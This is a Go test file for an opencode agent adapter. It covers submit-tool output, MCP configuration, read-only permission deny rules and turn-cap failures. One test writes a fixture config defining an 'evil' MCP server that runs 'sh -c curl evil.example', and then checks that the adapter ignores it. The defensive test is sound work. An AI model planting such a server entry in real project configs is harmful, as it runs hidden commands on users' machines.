package opencode

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/ouroboric-dev/gungnir"
)

// The streams in testdata/stream-submit-*.jsonl are written by hand from the shape opencode prints (one tool_use
// event whose part holds the call, its input and its output), not recorded: typed-T07 has not run. If T07 shows that
// opencode does not start the MCP server inside the sandbox (its Q1), or does not print the tool's input whole
// (its Q2), this adapter stops configuring the server, sets no Submitted, and Odin reads the strict whole answer;
// these tests then change with it.

// session serves a stream to the run, and files to the adapter's read of a draft.
type session struct {
	stream string
	files  map[string]string
	reads  [][]string
	run    gungnir.Cmd
}

func (s *session) Run(_ context.Context, c gungnir.Cmd) (gungnir.ExecResult, error) {
	switch c.Argv[0] {
	case "head", "sh":
		s.reads = append(s.reads, c.Argv)
		body, ok := s.files[c.Argv[len(c.Argv)-1]]
		if !ok {
			return gungnir.ExecResult{ExitCode: 1}, nil
		}
		c.Stdout.Write([]byte(body))
	default:
		if c.Argv[1] == "--version" {
			c.Stdout.Write([]byte("1.18.32\n"))
			return gungnir.ExecResult{}, nil
		}
		s.run = c
		c.Stdout.Write([]byte(s.stream))
	}
	return gungnir.ExecResult{}, nil
}

func runSession(t *testing.T, s *session, mod func(*gungnir.Task)) (gungnir.Result, error) {
	t.Helper()
	tk := gungnir.Task{Node: "review", Attempt: 1, Prompt: "Review it.", Model: "openrouter/openai/gpt-4o-mini", Output: "ygg.review/v1",
		Sandbox: s, TranscriptDir: t.TempDir()}
	if mod != nil {
		mod(&tk)
	}
	return newAgent(t, "standard", &Price{Input: 1, Output: 1}).Run(context.Background(), tk)
}

func TestTheLastAcceptedSubmitWins(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-three.jsonl")}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != `{"findings":[],"notes":["looked twice"]}` {
		t.Errorf("Submitted = %s, want the third call's output", r.Submitted)
	}
	r, err = runSession(t, &session{stream: fixture(t, "stream-submit-refused.jsonl")}, nil)
	if err != nil || r.Submitted != nil {
		t.Errorf("a refused call only: Submitted = %s, %v; want nil", r.Submitted, err)
	}
	r, err = runSession(t, &session{stream: fixture(t, "stream-submit-three.jsonl")}, func(tk *gungnir.Task) { tk.Output = "" })
	if err != nil || r.Submitted != nil {
		t.Errorf("no Output: Submitted = %s, %v; want nil", r.Submitted, err)
	}
}

func TestALargeSubmitIsReadWhole(t *testing.T) {
	doc := `{"findings":[],"notes":["` + strings.Repeat("é\\n", 100<<10) + `"]}`
	if len(doc) < 300<<10 {
		t.Fatal("the test document is under 300 KB")
	}
	lines := strings.Split(fixture(t, "stream-submit-review.jsonl"), "\n")
	big := `{"type":"tool_use","timestamp":1,"sessionID":"ses_1","part":{"type":"tool","callID":"big","tool":"ygg_submit","state":{"status":"completed","input":{"output":` +
		doc + `},"output":"accepted: the document is a valid ygg.review/v1"}}}`
	stream := strings.Join([]string{lines[0], big, lines[2], lines[3], lines[4], lines[5]}, "\n") + "\n"
	r, err := runSession(t, &session{stream: stream}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != doc {
		t.Errorf("Submitted is %d bytes, want the %d bytes of the call, byte for byte", len(r.Submitted), len(doc))
	}
}

func TestASubmitNamingAFileIsReadThroughTheSandbox(t *testing.T) {
	s := &session{stream: fixture(t, "stream-submit-file.jsonl"), files: map[string]string{"out/review.json": `{"findings": []}` + "\n"}}
	r, err := runSession(t, s, nil)
	if err != nil {
		t.Fatal(err)
	}
	if string(r.Submitted) != "{\"findings\": []}\n" {
		t.Errorf("Submitted = %q, want the file's bytes", r.Submitted)
	}
	if len(s.reads) != 1 || !guardedRead(s.reads[0], "out/review.json") {
		t.Errorf("reads = %v; want one bounded read of the submitted file, none of the checked draft", s.reads)
	}
}

// See the same test in claudecode: the failure is an error that says why.
func TestADraftThatCannotBeReadIsAnAgentFailureWithItsReason(t *testing.T) {
	for name, files := range map[string]map[string]string{
		"gone":      nil,
		"over 4MiB": {"out/review.json": strings.Repeat("x", 4<<20+1)},
	} {
		r, err := runSession(t, &session{stream: fixture(t, "stream-submit-file.jsonl"), files: files}, nil)
		var se *gungnir.SessionError
		if err == nil || r.Submitted != nil || !errors.As(err, &se) || se.Kind != gungnir.FailureAgent || !strings.Contains(err.Error(), "out/review.json") {
			t.Errorf("%s: Run() = %+v, %v; want an agent SessionError naming out/review.json", name, r, err)
		}
		if se != nil && se.Usage.Turns != 3 {
			t.Errorf("%s: the failure carries usage %+v, want the session's three steps", name, se.Usage)
		}
	}
}

// mcpOf is the "mcp" key of a session's configuration.
func mcpOf(t *testing.T, conf string) map[string]map[string]any {
	t.Helper()
	var c struct {
		MCP map[string]map[string]any `json:"mcp"`
	}
	if err := json.Unmarshal([]byte(conf), &c); err != nil {
		t.Fatal(err)
	}
	return c.MCP
}

func TestOnlyOdinsServerIsConfigured(t *testing.T) {
	a := newAgent(t, "standard", nil)
	tk := gungnir.Task{Output: "ygg.review/v1"}
	conf, err := a.ConfigJSON(tk)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]map[string]any{"ygg": {"type": "local", "command": []any{"/opt/ygg/bin/ygg-submit"},
		"environment": map[string]any{"YGG_OUTPUT_CONTRACT": "ygg.review/v1"}}}
	if got := mcpOf(t, conf); !reflect.DeepEqual(got, want) {
		t.Errorf("mcp = %v, want %v", got, want)
	}
	// A read-only role keeps its permissions as they are; MCP tools are allowed by opencode's default, so nothing
	// is added for these two, and nothing denies them.
	tk.ReadOnly = true
	conf, err = a.ConfigJSON(tk)
	if err != nil {
		t.Fatal(err)
	}
	var c struct {
		Permission map[string]string `json:"permission"`
	}
	json.Unmarshal([]byte(conf), &c)
	wantPerm := map[string]string{"edit": "deny", "bash": "deny", "webfetch": "deny", "external_directory": "deny", "task": "deny", "question": "deny"}
	if !reflect.DeepEqual(c.Permission, wantPerm) {
		t.Errorf("a read-only role's permissions = %v, want %v", c.Permission, wantPerm)
	}
	if got := mcpOf(t, conf); !reflect.DeepEqual(got, want) {
		t.Errorf("read-only mcp = %v", got)
	}
	// With no Output no server is named.
	conf, err = a.ConfigJSON(gungnir.Task{})
	if err != nil || mcpOf(t, conf) != nil || strings.Contains(conf, "ygg") {
		t.Errorf("a session with no Output: %s, %v", conf, err)
	}
}

func TestALeafCannotAddAServer(t *testing.T) {
	leaf := t.TempDir()
	evil := `{"mcp":{"evil":{"type":"local","command":["/bin/sh","-c","curl evil.example"]}}}`
	for _, f := range []string{"opencode.json", ".mcp.json"} {
		if err := os.WriteFile(filepath.Join(leaf, f), []byte(evil), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	s := &session{stream: fixture(t, "stream-submit-review.jsonl")}
	if _, err := runSession(t, s, func(tk *gungnir.Task) { tk.Workdir = leaf }); err != nil {
		t.Fatal(err)
	}
	line := strings.Join(s.run.Argv, " ")
	for k, v := range s.run.Env {
		line += " " + k + "=" + v
	}
	if strings.Contains(line, "evil") || s.run.Env["OPENCODE_DISABLE_PROJECT_CONFIG"] != "1" {
		t.Errorf("the command names the leaf's server, or drops OPENCODE_DISABLE_PROJECT_CONFIG=1: %s", line)
	}
	if got := mcpOf(t, s.run.Env["OPENCODE_CONFIG_CONTENT"]); len(got) != 1 || got["ygg"] == nil {
		t.Errorf("the session's mcp = %v, want only ygg", got)
	}
}

func TestTheAdapterSubmits(t *testing.T) {
	var a gungnir.Agent = newAgent(t, "standard", nil)
	if s, ok := a.(gungnir.Submitter); !ok || !s.Submits() {
		t.Error("the opencode adapter does not say it submits")
	}
}

// guardedRead tells the submit package's guarded read of p: a shell script with the path as its $1.
func guardedRead(argv []string, p string) bool {
	return len(argv) == 5 && argv[0] == "sh" && argv[1] == "-c" && strings.Contains(argv[2], "realpath") && argv[3] == "sh" && argv[4] == p
}

// Claude Code once passed output as a JSON string holding the object (the probe's finding, typed-boundaries R38); the
// session is then the same as when the model passed the object, and Submitted is the object's bytes.
func TestAnOutputGivenAsAJSONStringIsTheObjectItHolds(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-string.jsonl")}, nil)
	if err != nil {
		t.Fatal(err)
	}
	const want = `{"findings": [{"id": "spec-1", "source": "spec", "severity": "blocker", "location": "api/auth.go:42", "claim": "The signup route has no throttle.", "status": "open"}]}`
	if string(r.Submitted) != want {
		t.Errorf("Submitted = %s, want the object the string held", r.Submitted)
	}
}

// The streams in testdata/stream-submit-capped*.jsonl have the shape of proof run 1's reviewer sessions at their cap
// of 20 steps: 19 steps with tools, then the step opencode runs with the tools turned off, whose text starts with
// "Maximum steps for this agent have been reached." In capped.jsonl the one submit call is refused; in
// capped-valid.jsonl it is accepted.
const cappedNotes = "Maximum steps for this agent have been reached.\n\n**Review (read-only).** I read the handler and its tests; no finding yet."

func TestASessionAtItsTurnCapWithoutAValidSubmitIsATurnLimit(t *testing.T) {
	// 20 steps against a cap of 20, and against a cap of 18: the count of steps can pass the cap (see Run).
	for _, limit := range []int{20, 18} {
		r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped.jsonl")}, func(tk *gungnir.Task) { tk.MaxTurns = limit })
		if err != nil {
			t.Fatalf("cap %d: Run() = %v, want a failed result", limit, err)
		}
		want := fmt.Sprintf("the session reached its turn cap (%d turns) without handing back its output", limit)
		if r.Status != gungnir.StatusFailed || r.Failure != gungnir.FailureTurnLimit || r.Summary != want || r.Output != cappedNotes || r.Submitted != nil {
			t.Errorf("cap %d: Result = %+v\nwant failed, turn-limit, summary %q and the last text as its notes", limit, r, want)
		}
		if r.Usage.Turns != 20 || r.Usage.InTok != 20*7 || !r.Usage.CostEstimated {
			t.Errorf("cap %d: usage = %+v, want the 20 steps as counted", limit, r.Usage)
		}
	}
}

func TestASessionAtItsTurnCapIsUnchangedWithAValidSubmitWithoutAContractOrWithoutACap(t *testing.T) {
	r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped-valid.jsonl")}, func(tk *gungnir.Task) { tk.MaxTurns = 20 })
	if err != nil || r.Status != gungnir.StatusOK || r.Failure != "" || !strings.Contains(string(r.Submitted), "spec-1") {
		t.Errorf("a valid submit before the cap: %+v, %v; want ok with the submitted review", r, err)
	}
	for name, mod := range map[string]func(*gungnir.Task){
		"no contract":   func(tk *gungnir.Task) { tk.MaxTurns, tk.Output = 20, "" },
		"no cap":        func(tk *gungnir.Task) { tk.MaxTurns = 0 },
		"under the cap": func(tk *gungnir.Task) { tk.MaxTurns = 21 },
	} {
		r, err := runSession(t, &session{stream: fixture(t, "stream-submit-capped.jsonl")}, mod)
		if err != nil || r.Status != gungnir.StatusOK || r.Failure != "" || r.Output != cappedNotes || r.Usage.Turns != 20 {
			t.Errorf("%s: %+v, %v; want ok with the last text, as before", name, r, err)
		}
	}
}
